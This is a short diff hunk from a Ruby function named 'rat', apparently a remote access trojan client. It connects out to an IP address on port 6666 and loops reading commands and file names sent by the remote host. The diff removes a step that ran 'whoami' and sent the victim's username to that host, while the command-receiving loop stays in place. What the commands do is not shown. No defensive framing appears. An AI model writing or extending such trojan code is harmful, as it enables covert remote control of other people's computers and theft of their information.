@@ -25,11 +25,6 @@ def rat(ip)
   end
   begin
     socket = TCPSocket.new(ip, 6666)
-    username = `whoami`
-    if Gem.win_platform?
-      username = username.split('\\')[1]
-    end
-    socket.puts username
     loop do
       command, file, format = socket.gets.chomp.split(' ')
       case command
